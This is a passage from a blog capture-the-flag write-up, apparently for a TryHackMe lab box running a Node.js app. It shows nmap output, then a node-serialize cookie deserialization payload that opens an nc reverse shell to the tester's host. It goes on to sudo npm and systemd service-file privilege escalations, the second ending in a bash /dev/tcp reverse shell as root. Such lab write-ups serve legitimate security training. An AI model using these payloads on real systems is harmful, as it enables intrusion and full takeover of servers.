+Aggressive OS guesses: Linux 3.1 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, Linux 3.2 <span style=color:#f92672>(</span>95%<span style=color:#f92672>)</span>, AXIS 210A or <span style=color:#ae81ff>211</span> Network Camera <span style=color:#f92672>(</span>Linux 2.6.17<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>94%<span style=color:#f92672>)</span>, ASUS RT-N56U WAP <span style=color:#f92672>(</span>Linux 3.4<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Linux 3.16 <span style=color:#f92672>(</span>93%<span style=color:#f92672>)</span>, Adtran 424RG FTTH gateway <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 2.6.32 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 2.6.39 - 3.2 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.1 - 3.2 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>, Linux 3.11 <span style=color:#f92672>(</span>92%<span style=color:#f92672>)</span>
+No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
+Uptime guess: 33.159 days <span style=color:#f92672>(</span>since Tue Aug  <span style=color:#ae81ff>2</span> 06:58:11 2022<span style=color:#f92672>)</span>
+Network Distance: <span style=color:#ae81ff>2</span> hops
+TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>259</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE <span style=color:#f92672>(</span>using port 80/tcp<span style=color:#f92672>)</span>
+HOP RTT      ADDRESS
+<span style=color:#ae81ff>1</span>   68.75 ms 10.8.0.1 <span style=color:#f92672>(</span>10.8.0.1<span style=color:#f92672>)</span>
+<span style=color:#ae81ff>2</span>   68.81 ms 10.10.213.208 <span style=color:#f92672>(</span>10.10.213.208<span style=color:#f92672>)</span>
+
+NSE: Script Post-scanning.
+Initiating NSE at 10:47
+Completed NSE at 10:47, 0.00s elapsed
+Initiating NSE at 10:47
+Completed NSE at 10:47, 0.00s elapsed
+Initiating NSE at 10:47
+Completed NSE at 10:47, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 26.19 seconds
+           Raw packets sent: <span style=color:#ae81ff>59</span> <span style=color:#f92672>(</span>4.152KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>40</span> <span style=color:#f92672>(</span>3.012KB<span style=color:#f92672>)</span>
+</code></pre></div><p>Navigate to port <code>8080</code>, click <code>LOGIN NOW</code>, put in the Email field of the login form <code>test@test.com</code> and in the password field <code>test</code>, open Burp Suite and Intercept the request. Then send it to Repeater.
+<br>
+The request should look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>GET /login? HTTP/1.1
+Host: 10.10.213.208:8080
+User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
+Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.213.208:8080/login
+Cookie: session<span style=color:#f92672>=</span>eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
+Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+
+
+</code></pre></div><p>In the <code>Cookie</code> header of the request if we decode the session value from base64 we identify a serialized object.</p>
+<ul>
+<li>Command: <code>echo -n "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D" | base64 -d</code></li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@kali:~$ echo -n <span style=color:#e6db74>&#34;eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D&#34;</span> | base64 -d
+<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;username&#34;</span>:<span style=color:#e6db74>&#34;Guest&#34;</span>,<span style=color:#e6db74>&#34;isGuest&#34;</span>:true,<span style=color:#e6db74>&#34;encoding&#34;</span>: <span style=color:#e6db74>&#34;utf-8&#34;</span><span style=color:#f92672>}</span>
+</code></pre></div><p>Then, we can send another request modifying the value of the cookie to identify any errors.
+<br>
+The request should look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>GET / HTTP/1.1
+Host: 10.10.213.208:8080
+User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
+Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.213.208:8080/login
+Cookie: session<span style=color:#f92672>=</span>eyJ1c2VybmFtZSI6Ik
+Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+
+
+</code></pre></div><p>The response containing information about <code>unserialize</code> function of <code>Node.js</code> is the following:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>HTTP/1.1 <span style=color:#ae81ff>500</span> Internal Server Error
+X-Powered-By: Express
+Content-Security-Policy: default-src <span style=color:#e6db74>&#39;none&#39;</span>
+X-Content-Type-Options: nosniff
+Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+Content-Length: <span style=color:#ae81ff>1160</span>
+Date: Sun, <span style=color:#ae81ff>04</span> Sep <span style=color:#ae81ff>2022</span> 08:08:19 GMT
+Connection: close
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+&lt;head&gt;
+&lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;SyntaxError: Unexpected end of JSON input&lt;br&gt; &amp;nbsp; &amp;nbsp;at JSON.parse <span style=color:#f92672>(</span>&amp;lt;anonymous&amp;gt;<span style=color:#f92672>)</span>&lt;br&gt; &amp;nbsp; &amp;nbsp;at Object.exports.unserialize <span style=color:#f92672>(</span>/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16<span style=color:#f92672>)</span>&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/www/VulnNet-Node/server.js:16:24&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle <span style=color:#f92672>[</span>as handle_request<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5<span style=color:#f92672>)</span>&lt;br&gt; &amp;nbsp; &amp;nbsp;at next <span style=color:#f92672>(</span>/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13<span style=color:#f92672>)</span>&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch <span style=color:#f92672>(</span>/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3<span style=color:#f92672>)</span>&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle <span style=color:#f92672>[</span>as handle_request<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5<span style=color:#f92672>)</span>&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.process_params <span style=color:#f92672>(</span>/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12<span style=color:#f92672>)</span>&lt;br&gt; &amp;nbsp; &amp;nbsp;at next <span style=color:#f92672>(</span>/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10<span style=color:#f92672>)</span>&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2>
+<p>We can create a serialized object that contains a reverse shell, base64 encode it and then URL encode any special characters.
+<br>
+The serialized object should look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript>{<span style=color:#e6db74>&#34;username&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;_$$ND_FUNC$$_function (){require(&#39;child_process&#39;).exec(\&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.200.50 443 &gt;/tmp/f\&#34;, function(error, stdout, stderr) { console.log(stdout) });}()&#34;</span>}
+</code></pre></div><p>Go in <code>Decoder</code> in Burp Suite and put the serialized object. Then click on <code>Encode as</code> and select <code>Base64</code> so the output should look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
+</code></pre></div><p>Before putting the base64 encoded value in the Cookie, URL encode any special characters. In my case, only the <code>+</code> should become <code>%2b</code>.
+<br>
+The final request in order to get reverse shell should look like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>GET / HTTP/1.1
+Host: 10.10.213.208:8080
+User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
+Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.213.208:8080/login
+Cookie: session<span style=color:#f92672>=</span>eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA%2bL3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
+Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
+
+
+</code></pre></div><p>Open a netcat listener and click <code>Send</code> on the Repeater tab and we get a reverse shell as <code>www</code></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
+listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
+connect to <span style=color:#f92672>[</span>10.8.200.50<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.213.208<span style=color:#f92672>]</span> <span style=color:#ae81ff>58244</span>
+/bin/sh: 0: can<span style=color:#e6db74>&#39;t access tty; job control turned off
+</span><span style=color:#e6db74>$ python3 -c &#39;</span>import pty;pty.spawn<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span><span style=color:#f92672>)</span><span style=color:#960050;background-color:#1e0010>&#39;</span>
+www@vulnnet-node:~/VulnNet-Node$ ^Z
+zsh: suspended  nc -lvnp <span style=color:#ae81ff>443</span>
+geobour98@kali:~$ stty raw -echo;fg
+1<span style=color:#f92672>]</span>  + continued  nc -lvnp <span style=color:#ae81ff>443</span>
+
+www@vulnnet-node:~/VulnNet-Node$ 
+www@vulnnet-node:~/VulnNet-Node$ export TERM<span style=color:#f92672>=</span>xterm-256color
+www@vulnnet-node:~/VulnNet-Node$ stty rows <span style=color:#ae81ff>38</span> cols <span style=color:#ae81ff>111</span>
+www@vulnnet-node:~/VulnNet-Node$ whoami
+www
+www@vulnnet-node:~/VulnNet-Node$ id
+uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>www<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>www<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>www<span style=color:#f92672>)</span>
+</code></pre></div><p>The server performed deserialization of the <code>Cookie</code> header so the reverse shell was executed. The payload used can be found in this great article: <a href=https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a>, which is about <code>Node.js</code> deserialization as in our case.</p>
+<h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2>
+<p>After executing the command: <code>sudo -l</code> we see that we can execute <code>npm</code> as <code>serv-manage</code> without being asked for password.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>www@vulnnet-node:~/VulnNet-Node$ sudo -l
+Matching Defaults entries <span style=color:#66d9ef>for</span> www on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+
+User www may run the following commands on vulnnet-node:
+    <span style=color:#f92672>(</span>serv-manage<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/npm
+</code></pre></div><p>A great exploit for this can be found on: <a href=https://gtfobins.github.io/gtfobins/npm/#sudo>https://gtfobins.github.io/gtfobins/npm/#sudo</a></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>www@vulnnet-node:~/VulnNet-Node$ cd /dev/shm
+www@vulnnet-node:/dev/shm$ echo <span style=color:#e6db74>&#39;{&#34;scripts&#34;: {&#34;preinstall&#34;: &#34;/bin/bash&#34;}}&#39;</span> &gt; /dev/shm/package.json
+www@vulnnet-node:/dev/shm$ sudo -u serv-manage npm -C /dev/shm/ --unsafe-perm i
+
+&gt; @ preinstall /dev/shm
+&gt; /bin/bash
+
+serv-manage@vulnnet-node:/dev/shm$ cd /home/serv-manage
+serv-manage@vulnnet-node:~$ id
+uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>serv-manage<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>serv-manage<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>serv-manage<span style=color:#f92672>)</span>
+serv-manage@vulnnet-node:~$ cat user.txt
+THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+</code></pre></div><p>Now we are the user <code>serv-manage</code>.
+<br>
+We execute <code>sudo -l</code> and we see that we can start/stop the following systemd timers and reload the systemd manager configuration as root.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>serv-manage@vulnnet-node:~$ sudo -l
+Matching Defaults entries <span style=color:#66d9ef>for</span> serv-manage on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+
+User serv-manage may run the following commands on vulnnet-node:
+    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /bin/systemctl daemon-reload
+</code></pre></div><p>Find where <code>vulnnet-auto.timer</code> is located and open that file.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>serv-manage@vulnnet-node:~$ locate vulnnet-auto.timer
+/etc/systemd/system/vulnnet-auto.timer
+serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
+<span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
+Description<span style=color:#f92672>=</span>Run VulnNet utilities every <span style=color:#ae81ff>30</span> min
+
+<span style=color:#f92672>[</span>Timer<span style=color:#f92672>]</span>
+OnBootSec<span style=color:#f92672>=</span>0min
+<span style=color:#75715e># 30 min job</span>
+OnCalendar<span style=color:#f92672>=</span>*:0/30
+Unit<span style=color:#f92672>=</span>vulnnet-job.service
+
+<span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
+WantedBy<span style=color:#f92672>=</span>basic.target
+</code></pre></div><p>We see that <code>vulnnet-job.service</code> is called so we find where this service is located and open it.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>serv-manage@vulnnet-node:~$ locate vulnnet-job.service
+/etc/systemd/system/vulnnet-job.service
+serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
+<span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
+Description<span style=color:#f92672>=</span>Logs system statistics to the systemd journal
+Wants<span style=color:#f92672>=</span>vulnnet-auto.timer
+
+<span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
+<span style=color:#75715e># Gather system statistics</span>
+Type<span style=color:#f92672>=</span>forking
+ExecStart<span style=color:#f92672>=</span>/bin/df
+
+<span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
+WantedBy<span style=color:#f92672>=</span>multi-user.target
+</code></pre></div><p>First, stop the timer with <code>systemctl</code>, then modify <code>vulnnet-job.service</code> in order to get reverse shell as root, reload the configuration and start the timer again with <code>systemctl</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
+serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
+<span style=color:#f92672>[</span>Unit<span style=color:#f92672>]</span>
+Description<span style=color:#f92672>=</span>Logs system statistics to the systemd journal
+Wants<span style=color:#f92672>=</span>vulnnet-auto.timer
+
+<span style=color:#f92672>[</span>Service<span style=color:#f92672>]</span>
+<span style=color:#75715e># Gather system statistics</span>
+Type<span style=color:#f92672>=</span>forking
+ExecStart<span style=color:#f92672>=</span>/bin/bash -c <span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/10.8.200.50/444 0&gt;&amp;1&#39;</span>
+
+<span style=color:#f92672>[</span>Install<span style=color:#f92672>]</span>
+WantedBy<span style=color:#f92672>=</span>multi-user.target
+serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload
+serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer
+</code></pre></div><p>Open another netcat listener on <code>444</code> port and we get root reverse shell.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>444</span>   
+listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>444</span> ...
+connect to <span style=color:#f92672>[</span>10.8.200.50<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.213.208<span style=color:#f92672>]</span> <span style=color:#ae81ff>55696</span>
+bash: cannot set terminal process group <span style=color:#f92672>(</span>1119<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
+bash: no job control in this shell
+root@vulnnet-node:/# cd /root
+root@vulnnet-node:/root# id    
+uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
+root@vulnnet-node:/root# cat root.txt
+THM<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+</code></pre></div><p>Proof of Concept (PoC image):
+<img src=../../../thm/vulnnetnode/vulnnetnode.png alt="VulnNet: Node photo" style=width:700px;height:300px>
+</p>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://geobour98.github.io/tags/linux/>linux</a></li>
+<li><a href=https://geobour98.github.io/tags/web/>web</a></li>
+<li><a href=https://geobour98.github.io/tags/base64/>base64</a></li>
+<li><a href=https://geobour98.github.io/tags/deserialization/>deserialization</a></li>
+<li><a href=https://geobour98.github.io/tags/node.js/>node.js</a></li>
+<li><a href=https://geobour98.github.io/tags/sudo/>sudo</a></li>
+<li><a href=https://geobour98.github.io/tags/npm/>npm</a></li>
+<li><a href=https://geobour98.github.io/tags/systemctl/>systemctl</a></li>
+<li><a href=https://geobour98.github.io/tags/service/>service</a></li>
+</ul>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2023 <a href=https://geobour98.github.io/>geobour98</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerHTML='copy';function d(){a.innerHTML='copied!',setTimeout(()=>{a.innerHTML='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
